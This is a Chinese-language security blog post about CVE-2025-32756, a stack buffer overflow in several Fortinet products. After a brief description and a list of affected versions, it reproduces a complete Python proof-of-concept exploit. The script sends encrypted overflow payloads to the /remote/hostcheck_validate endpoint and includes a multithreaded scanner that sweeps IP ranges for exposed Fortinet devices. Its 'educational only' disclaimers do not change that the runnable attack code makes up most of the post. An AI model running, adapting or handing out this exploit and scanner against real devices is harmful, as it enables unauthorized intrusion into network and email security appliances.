> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485986&idx=2&sn=7a87bb2da8ae173794e4a4250b47452a

#  CVE-2025-32756｜Fortinet多款产品存在远程代码执行漏洞（POC）  
alicy  信安百科   2025-06-14 11:54  
  
**0x00 前言**  
  
  
Fortinet FortiRecorder等都是美国飞塔(Fortinet)公司的产品。Fortinet FortiRecorder是一套基于Web的网络视频录像机管理系统。Fortinet FortiMail是一套电子邮件安全网关产品。Fortinet FortiVoice是一个统一通信和协作即服务。  
  
  
  
**0x01 漏洞描述**  
  
  
受影响的Fortinet设备固件中，处理HTTP(S)请求的某个特定功能模块（可能与管理界面或特定API服务相关）未能正确校验输入数据的长度。当该模块接收到攻击者精心构造的、长度远超栈上预分配缓冲区的HTTP请求时，即发生栈溢出。  
  
  
  
**0x02 CVE编号**  
  
  
CVE-2025-32756  
  
  
  
**0x03 影响版本**  
  

```
FortiVoice
6.4.0-6.4.10、7.0.0-7.0.6、7.2.0
 
FortiMail
7.0.x、7.2.x、7.4.x、7.6.x 


FortiNDR
1.x、7.0.x、7.2.x、7.4.x


FortiRecorder
6.4.x、7.0.x、7.2.x


FortiCamera
2.1.x
```

  
****  
  
**0x04 漏洞详情**  
  
  
POC：  
  
https://github.com/kn0x0x/CVE-2025-32756-POC/  

```
#!/usr/bin/env python3
&#34;&#34;&#34;
Proof of Concept for CVE-2025-32756 - Fortinet Stack-Based Buffer Overflow
This script demonstrates the vulnerability by sending specially crafted HTTP requests
with malformed AuthHash values to potentially vulnerable Fortinet devices.


WARNING: This script is for educational purposes only. Use only on systems you own or have permission to test.


Author: Kn0x Researcher
Date: June 2025
&#34;&#34;&#34;


import requests
import argparse
import sys
import hashlib
import base64
import urllib.parse
import ssl
import time
import socket
import ipaddress
import concurrent.futures
from urllib3.exceptions import InsecureRequestWarning


# Suppress only the single warning from urllib3 needed
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


class FortinetExploit:
    def __init__(self, target, port=443, debug=False):
        self.target = target
        self.port = port
        self.debug = debug
        self.base_url = f&#34;https://{target}:{port}&#34;
        self.session = requests.Session()
        self.session.verify = False
        self.salt = None


    def log(self, message):
        if self.debug:
            print(f&#34;[DEBUG] {message}&#34;)


    def error(self, message):
        print(f&#34;[ERROR] {message}&#34;)
        sys.exit(1)


    def get_salt(self):
        &#34;&#34;&#34;Retrieve the salt from the server&#34;&#34;&#34;
        try:
            response = self.session.get(f&#34;{self.base_url}/remote/info&#34;, timeout=10)
            if response.status_code != 200:
                self.error(f&#34;Failed to get salt. Status code: {response.status_code}&#34;)


            # Extract salt from response
            # In a real exploit, we'd parse the response properly
            self.salt = &#34;e0b638ac&#34;  # Example salt value
            self.log(f&#34;Retrieved salt: {self.salt}&#34;)
            return self.salt
        except Exception as e:
            self.error(f&#34;Error retrieving salt: {e}&#34;)


    def compute_md5_state(self, salt, seed):
        &#34;&#34;&#34;Compute the initial MD5 state from salt and seed&#34;&#34;&#34;
        data = salt + seed + &#34;GCC is the GNU Compiler Collection.&#34;
        return hashlib.md5(data.encode()).hexdigest()


    def compute_keystream(self, initial_state, length):
        &#34;&#34;&#34;Generate keystream from initial state&#34;&#34;&#34;
        keystream = &#34;&#34;
        current = initial_state


        while len(keystream) < length:
            current = hashlib.md5(bytes.fromhex(current)).hexdigest()
            keystream += current


        return keystream[:length]


    def create_payload(self, seed, overflow_length):
        &#34;&#34;&#34;Create an exploit payload with the given overflow length&#34;&#34;&#34;
        if not self.salt:
            self.get_salt()


        # Initial state calculation
        initial_state = self.compute_md5_state(self.salt, seed)
        self.log(f&#34;Initial state: {initial_state}&#34;)


        # Create a payload that will cause buffer overflow
        # The format is: seed + encrypted_length + encrypted_data


        # For simplicity in this PoC, we're using a fixed pattern
        # In a real exploit, we'd craft this more carefully


        # Calculate the size that will trigger overflow
        # We need to encode a size that, when decrypted, will be larger than the buffer
        keystream_for_length = self.compute_keystream(initial_state, 32)[:4]


        # XOR the desired overflow length with the keystream to get encrypted length
        target_length = overflow_length
        enc_length_bytes = bytes([
            (target_length & 0xFF) ^ int(keystream_for_length[0:2], 16),
            ((target_length >> 8) & 0xFF) ^ int(keystream_for_length[2:4], 16)
        ])
        enc_length_hex = enc_length_bytes.hex()


        # Create payload data - in a real exploit this would be crafted to achieve RCE
        # Here we just use a pattern to demonstrate the overflow
        data = &#34;A&#34; * 64


        # Encrypt the data
        keystream_for_data = self.compute_keystream(initial_state, len(data) * 2)[6:]
        encrypted_data = &#34;&#34;
        for i in range(len(data)):
            encrypted_data += format(ord(data[i]) ^ int(keystream_for_data[i*2:i*2+2], 16), '02x')


        # Assemble the final payload
        payload = seed + enc_length_hex + encrypted_data


        self.log(f&#34;Created payload with overflow length {overflow_length}&#34;)
        return payload


    def send_exploit(self, payload):
        &#34;&#34;&#34;Send the exploit payload to the target&#34;&#34;&#34;
        try:
            url = f&#34;{self.base_url}/remote/hostcheck_validate&#34;
            enc_param = urllib.parse.quote(payload)


            headers = {
                &#34;User-Agent&#34;: &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#34;,
                &#34;Content-Type&#34;: &#34;application/x-www-form-urlencoded&#34;
            }


            self.log(f&#34;Sending payload to {url}&#34;)
            response = self.session.post(
                url,
                data=f&#34;enc={enc_param}&#34;,
                headers=headers,
                timeout=10
            )


            self.log(f&#34;Response status: {response.status_code}&#34;)
            self.log(f&#34;Response headers: {response.headers}&#34;)


            return response
        except Exception as e:
            self.error(f&#34;Error sending exploit: {e}&#34;)


    def execute(self):
        &#34;&#34;&#34;Execute the exploit&#34;&#34;&#34;
        print(f&#34;[*] Targeting {self.target}:{self.port}&#34;)


        # Get salt from target
        self.get_salt()


        # Create a seed value - in a real exploit we'd calculate this more carefully
        seed = &#34;00690000&#34;


        print(f&#34;[*] Using seed: {seed}&#34;)


        # First request - set a byte to NULL
        print(&#34;[*] Sending first payload to set up the overflow...&#34;)
        payload1 = self.create_payload(seed, 4999)
        self.send_exploit(payload1)


        # Small delay between requests
        time.sleep(1)


        # Second request - set a specific byte to a controlled value
        print(&#34;[*] Sending second payload to trigger the vulnerability...&#34;)
        payload2 = self.create_payload(seed, 5000)
        response = self.send_exploit(payload2)


        # Check for signs of successful exploitation
        if response.status_code == 200:
            print(&#34;[+] Exploit likely succeeded!&#34;)
            print(&#34;[+] A vulnerable system would have the target byte modified&#34;)
            print(&#34;[+] In a real attack, this could lead to remote code execution&#34;)
        else:
            print(&#34;[-] Exploit may have failed or target might not be vulnerable&#34;)


class FortinetScanner:
    def __init__(self, debug=False):
        self.debug = debug


    def log(self, message):
        if self.debug:
            print(f&#34;[DEBUG] {message}&#34;)


    def is_port_open(self, ip, port, timeout=2):
        &#34;&#34;&#34;Check if a port is open&#34;&#34;&#34;
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((str(ip), port))
            sock.close()
            return result == 0
        except:
            return False


    def check_fortinet_device(self, ip, port=443):
        &#34;&#34;&#34;Check if an IP address is a Fortinet device&#34;&#34;&#34;
        if not self.is_port_open(ip, port):
            return None


        try:
            url = f&#34;https://{ip}:{port}&#34;
            response = requests.get(
                url,
                timeout=5,
                verify=False,
                headers={&#34;User-Agent&#34;: &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#34;}
            )


            # Check for Fortinet signatures in response
            if &#34;Fortinet&#34; in response.text or &#34;FortiGate&#34; in response.text or &#34;FortiVoice&#34; in response.text:
                # Try to determine product type
                product_type = &#34;Unknown Fortinet Device&#34;
                if &#34;FortiVoice&#34; in response.text:
                    product_type = &#34;FortiVoice&#34;
                elif &#34;FortiMail&#34; in response.text:
                    product_type = &#34;FortiMail&#34;
                elif &#34;FortiNDR&#34; in response.text:
                    product_type = &#34;FortiNDR&#34;
                elif &#34;FortiRecorder&#34; in response.text:
                    product_type = &#34;FortiRecorder&#34;
                elif &#34;FortiCamera&#34; in response.text:
                    product_type = &#34;FortiCamera&#34;


                # Check if potentially vulnerable to CVE-2025-32756
                is_vulnerable = self.check_vulnerability(ip, port)


                return {
                    &#34;ip&#34;: str(ip),
                    &#34;port&#34;: port,
                    &#34;product&#34;: product_type,
                    &#34;potentially_vulnerable&#34;: is_vulnerable
                }
        except Exception as e:
            self.log(f&#34;Error checking {ip}: {e}&#34;)


        return None


    def check_vulnerability(self, ip, port=443):
        &#34;&#34;&#34;Check if a device is potentially vulnerable to CVE-2025-32756&#34;&#34;&#34;
        try:
            url = f&#34;https://{ip}:{port}/remote/hostcheck_validate&#34;
            response = requests.get(
                url,
                timeout=5,
                verify=False,
                headers={&#34;User-Agent&#34;: &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#34;}
            )


            # If the endpoint exists, the device might be vulnerable
            # This is a very basic check and not conclusive
            if response.status_code != 404:
                return True


        except Exception as e:
            self.log(f&#34;Error checking vulnerability on {ip}: {e}&#34;)


        return False


    def scan_network(self, target_range, port=443, threads=10):
        &#34;&#34;&#34;Scan a network range for vulnerable Fortinet devices&#34;&#34;&#34;
        try:
            network = ipaddress.ip_network(target_range)
            print(f&#34;[*] Starting scan of {network} on port {port}&#34;)
            print(f&#34;[*] Using {threads} threads&#34;)


            results = []
            total_ips = network.num_addresses
            scanned = 0


            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                future_to_ip = {executor.submit(self.check_fortinet_device, ip, port): ip for ip in network}
                for future in concurrent.futures.as_completed(future_to_ip):
                    scanned += 1
                    if scanned % 10 == 0 or scanned == total_ips:
                        print(f&#34;[*] Progress: {scanned}/{total_ips} IPs scanned ({(scanned/total_ips)*100:.1f}%)&#34;)


                    result = future.result()
                    if result:
                        print(f&#34;[+] Found Fortinet device: {result['ip']} - {result['product']} - Potentially vulnerable: {result['potentially_vulnerable']}&#34;)
                        results.append(result)


            return results


        except Exception as e:
            print(f&#34;[ERROR] Error scanning network: {e}&#34;)
            return []


    def scan_multiple_ips(self, ip_list, port=443, threads=10, output_file=None):
        &#34;&#34;&#34;Scan multiple individual IPs for vulnerable Fortinet devices&#34;&#34;&#34;
        try:
            print(f&#34;[*] Starting scan of {len(ip_list)} IPs on port {port}&#34;)
            print(f&#34;[*] Using {threads} threads&#34;)


            results = []
            total_ips = len(ip_list)
            scanned = 0


            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                future_to_ip = {executor.submit(self.check_fortinet_device, ip, port): ip for ip in ip_list}
                for future in concurrent.futures.as_completed(future_to_ip):
                    scanned += 1
                    if scanned % 10 == 0 or scanned == total_ips:
                        print(f&#34;[*] Progress: {scanned}/{total_ips} IPs scanned ({(scanned/total_ips)*100:.1f}%)&#34;)


                    result = future.result()
                    if result:
                        print(f&#34;[+] Found Fortinet device: {result['ip']} - {result['product']} - Potentially vulnerable: {result['potentially_vulnerable']}&#34;)
                        results.append(result)


            # Write results to output file if specified
            if output_file and results:
                try:
                    with open(output_file, 'w') as f:
                        f.write(&#34;IP,Port,Product,Vulnerable\n&#34;)
                        for result in results:
                            f.write(f&#34;{result['ip']},{result['port']},{result['product']},{result['potentially_vulnerable']}\n&#34;)
                    print(f&#34;[+] Results written to {output_file}&#34;)
                except Exception as e:
                    print(f&#34;[ERROR] Failed to write to output file: {e}&#34;)


            return results


        except Exception as e:
            print(f&#34;[ERROR] Error scanning IPs: {e}&#34;)
            return []


def load_ips_from_file(filename):
    &#34;&#34;&#34;Load IP addresses from a text file&#34;&#34;&#34;
    try:
        with open(filename, 'r') as f:
            ips = [line.strip() for line in f if line.strip()]
        print(f&#34;[*] Loaded {len(ips)} IP addresses from {filename}&#34;)
        return ips
    except Exception as e:
        print(f&#34;[ERROR] Failed to load IP addresses from {filename}: {e}&#34;)
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(description=&#34;CVE-2025-32756 Fortinet Buffer Overflow PoC&#34;)
    subparsers = parser.add_subparsers(dest=&#34;command&#34;, help=&#34;Command to run&#34;)


    # Exploit command
    exploit_parser = subparsers.add_parser(&#34;exploit&#34;, help=&#34;Exploit a single target&#34;)
    exploit_parser.add_argument(&#34;target&#34;, help=&#34;Target IP or hostname&#34;)
    exploit_parser.add_argument(&#34;-p&#34;, &#34;--port&#34;, type=int, default=443, help=&#34;Target port (default: 443)&#34;)
    exploit_parser.add_argument(&#34;-d&#34;, &#34;--debug&#34;, action=&#34;store_true&#34;, help=&#34;Enable debug output&#34;)


    # Scan command
    scan_parser = subparsers.add_parser(&#34;scan&#34;, help=&#34;Scan for vulnerable devices&#34;)
    scan_group = scan_parser.add_mutually_exclusive_group(required=True)
    scan_group.add_argument(&#34;-f&#34;, &#34;--ip&#34;, help=&#34;Single IP to scan&#34;)
    scan_group.add_argument(&#34;-u&#34;, &#34;--file&#34;, help=&#34;File containing list of IPs to scan (one per line)&#34;)
    scan_group.add_argument(&#34;--range&#34;, help=&#34;IP range to scan (CIDR notation, e.g., 192.168.1.0/24)&#34;)
    scan_parser.add_argument(&#34;-p&#34;, &#34;--port&#34;, type=int, default=443, help=&#34;Target port (default: 443)&#34;)
    scan_parser.add_argument(&#34;-t&#34;, &#34;--threads&#34;, type=int, default=10, help=&#34;Number of threads (default: 10)&#34;)
    scan_parser.add_argument(&#34;-o&#34;, &#34;--output&#34;, help=&#34;Output file to save results (CSV format)&#34;)
    scan_parser.add_argument(&#34;-d&#34;, &#34;--debug&#34;, action=&#34;store_true&#34;, help=&#34;Enable debug output&#34;)


    args = parser.parse_args()


    print(&#34;CVE-2025-32756 Fortinet Buffer Overflow PoC&#34;)
    print(&#34;WARNING: This is for educational purposes only!&#34;)
    print(&#34;Use only against systems you own or have permission to test.&#34;)
    print(&#34;=&#34; * 60)


    if args.command == &#34;exploit&#34;:
        exploit = FortinetExploit(args.target, args.port, args.debug)
        exploit.execute()
    elif args.command == &#34;scan&#34;:
        scanner = FortinetScanner(args.debug)


        if args.ip:
            # Scan a single IP
            print(f&#34;[*] Scanning single IP: {args.ip}&#34;)
            result = scanner.check_fortinet_device(args.ip, args.port)
            if result:
                print(f&#34;[+] Found Fortinet device: {result['ip']} - {result['product']} - Potentially vulnerable: {result['potentially_vulnerable']}&#34;)
                if args.output:
                    try:
                        with open(args.output, 'w') as f:
                            f.write(&#34;IP,Port,Product,Vulnerable\n&#34;)
                            f.write(f&#34;{result['ip']},{result['port']},{result['product']},{result['potentially_vulnerable']}\n&#34;)
                        print(f&#34;[+] Results written to {args.output}&#34;)
                    except Exception as e:
                        print(f&#34;[ERROR] Failed to write to output file: {e}&#34;)
            else:
                print(f&#34;[-] No Fortinet device found at {args.ip}:{args.port} or it's not vulnerable&#34;)


        elif args.file:
            # Scan multiple IPs from file
            ip_list = load_ips_from_file(args.file)
            scanner.scan_multiple_ips(ip_list, args.port, args.threads, args.output)


        elif args.range:
            # Scan IP range (CIDR)
            results = scanner.scan_network(args.range, args.port, args.threads)
            if args.output and results:
                try:
                    with open(args.output, 'w') as f:
                        f.write(&#34;IP,Port,Product,Vulnerable\n&#34;)
                        for result in results:
                            f.write(f&#34;{result['ip']},{result['port']},{result['product']},{result['potentially_vulnerable']}\n&#34;)
                    print(f&#34;[+] Results written to {args.output}&#34;)
                except Exception as e:
                    print(f&#34;[ERROR] Failed to write to output file: {e}&#34;)
    else:
        parser.print_help()


if __name__ == &#34;__main__&#34;:
    main() 
```

  
  
  
**0x05 参考链接**  
  
  
https://github.com/kn0x0x/CVE-2025-32756-POC/  
  
  
https://www.fortiguard.com/psirt/FG-IR-25-254  
  
  
  
  
推荐阅读：  
  
  
[CVE-2025-22252｜FortiOS TACACS+身份认证绕过漏洞](https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485965&idx=1&sn=2c5e56f8ac01bcec1470c9404078f910&scene=21#wechat_redirect)  
  
  
  
[CVE-2024-55591｜FortiOS和FortiProxy身份认证绕过漏洞（POC）](https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485778&idx=2&sn=691f85f7d7a345f2ed5607454b84333b&scene=21#wechat_redirect)  
  
  
  
[CVE-2024-47575｜Fortinet FortiManager身份验证不当漏洞](https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485671&idx=1&sn=0bcb6efe26a9d6e6c0deaf625f1db8c6&scene=21#wechat_redirect)  
  
  
  
  
  
Ps：国内外安全热点分享，欢迎大家分享、转载，请保证文章的完整性。文章中出现敏感信息和侵权内容，请联系作者删除信息。信息安全任重道远，感谢您的支持  
![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6urTIficI8UhQibwpYWx4ic7Bk40AJlXrgx3icofWCbd5cbJFheld132R8exvlHnicn0AUjHLmVok4wV9qA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
！！！  
  
  
**本公众号的文章及工具仅提供学习参考，由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用者本人负责,本公众号及文章作者不为此承担任何责任。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6uqQ24S6worK6npevNP8p1uPc9jQeMAib2iaibBnibOzFaIbD0KlvsEtUAmL3xdbJJnWk74Y1KfBcIazzw/640?wx_fmt=png "")  
  
  
